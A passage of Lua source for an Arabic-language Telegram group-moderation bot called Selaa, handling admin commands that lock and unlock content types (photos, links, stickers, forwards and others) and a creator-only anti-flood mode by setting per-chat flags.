Selaa:srem(Selaa.."Selaa:Lock:Pinpin",msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source Selaa     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not Selaa:get(Selaa..'Selaa:Lock:Text'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الدردشه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Text'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not Selaa:get(Selaa..'Selaa:Lock:Inline'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الاونلاين بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Inline'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not Selaa:get(Selaa..'Selaa:Lock:Photo'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الصور بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Photo'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not Selaa:get(Selaa..'Selaa:Lock:Spam'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الكلايش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Spam'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not Selaa:get(Selaa..'Selaa:Lock:Join'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الدخول بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Join'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not Selaa:get(Selaa..'Selaa:Lock:Videos'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الفيديو بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Videos'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not Selaa:get(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل المتحركه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not Selaa:get(Selaa..'Selaa:Lock:Music'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الاغاني بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Music'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not Selaa:get(Selaa..'Selaa:Lock:Voice'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الصوت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Voice'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الروابط بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Links'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not Selaa:get(Selaa..'Selaa:Lock:Location'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل المواقع بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Location'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل المعرفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Tags'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not Selaa:get(Selaa..'Selaa:Lock:Document'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الملفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Document'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الهاشتاك بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not Selaa:get(Selaa..'Selaa:Lock:Contact'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الجهات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Contact'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '️↯☆الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الشبكات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_,true) 
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل العربيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانجليزيه" then
if not Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الانجليزيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:English'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الانجليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not Selaa:get(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الملصقات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not Selaa:get(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الماركداون بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الاشعارات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التوجيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     Source Selaa     --
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if Selaa:get(Selaa..'Selaa:Lock:Text'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الدردشه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Text'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if Selaa:get(Selaa..'Selaa:Lock:Photo'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الصور بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Photo'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if Selaa:get(Selaa..'Selaa:Lock:Spam'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الكلايش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Spam'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if Selaa:get(Selaa..'Selaa:Lock:Join'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الدخول بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Join'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if Selaa:get(Selaa..'Selaa:Lock:Videos'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الفيديو بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Videos'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if Selaa:get(Selaa..'Selaa:Lock:Document'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الملفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Document'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if Selaa:get(Selaa..'Selaa:Lock:Inline'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الاونلاين بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Inline'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if Selaa:get(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الماركداون بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if Selaa:get(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح المتحركه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if Selaa:get(Selaa..'Selaa:Lock:Music'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الاغاني بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Music'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if Selaa:get(Selaa..'Selaa:Lock:Voice'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الصوت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Voice'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الروابط بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Links'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if Selaa:get(Selaa..'Selaa:Lock:Location'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح المواقع بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Location'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح المعرفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Tags'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الهاشتاك بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if Selaa:get(Selaa..'Selaa:Lock:Contact'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الجهات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Contact'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الشبكات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح العربيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانجليزيه" then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الانجليزيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:English'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الانجليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الاشعارات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if Selaa:get(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الملصقات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح التوجيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     Source Selaa     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") then
if not Constructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمنشئين فقط', 1, 'md')
else
Selaa:set(Selaa.."Selaa:Lock:Bots"..msg.chat_id_,"del") Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del") 
LockList ={'Selaa:Lock:Links','Selaa:Lock:Contact','Selaa:Lock:Forwards','Selaa:Lock:Videos','Selaa:Lock:Gifs','Selaa:Lock:EditMsgs','Selaa:Lock:Stickers','Selaa:Lock:Farsi','Selaa:Lock:Spam','Selaa:Lock:WebLinks','Selaa:Lock:Photo'}
for i,Lock in pairs(LockList) do
Selaa:set(Selaa..Lock..msg.chat_id_,true)
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التفليش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح التفليش$") then
if not Constructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمنشئين فقط', 1, 'md')
else
Selaa:hdel(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Selaa:Lock:Links','Selaa:Lock:Contact','Selaa:Lock:Forwards','Selaa:Lock:Videos','Selaa:Lock:Gifs','Selaa:Lock:EditMsgs','Selaa:Lock:Stickers','Selaa:Lock:Farsi','Selaa:Lock:Spam','Selaa:Lock:WebLinks','Selaa:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
Selaa:del(Selaa..UnLock..msg.chat_id_)
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح التفليش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
--     Source Selaa     --
if text and text:match("^قفل الكل$") then
if not Constructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمنشئين فقط', 1, 'md')
else
Selaa:del(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_) Selaa:del(Selaa..'Selaa:Lock:Taf'..msg.chat_id_) Selaa:del(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_) 
Selaa:set(Selaa.."Selaa:Lock:Bots"..msg.chat_id_,"del") Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del") 
LockList ={'Selaa:Lock:EditMsgs','Selaa:Lock:Farsi','Selaa:Lock:TagServr','Selaa:Lock:Inline','Selaa:Lock:Photo','Selaa:Lock:Spam','Selaa:Lock:Videos','Selaa:Lock:Gifs','Selaa:Lock:Music','Selaa:Lock:Voice','Selaa:Lock:Links','Selaa:Lock:Location','Selaa:Lock:Tags','Selaa:Lock:Stickers','Selaa:Lock:Markdown','Selaa:Lock:Forwards','Selaa:Lock:Document','Selaa:Lock:Contact','Selaa:Lock:Hashtak','Selaa:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
Selaa:set(Selaa..Lock..msg.chat_id_,true)
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل جميع الاوامر \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح الكل$") then
if not Constructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمنشئين فقط', 1, 'md')
else
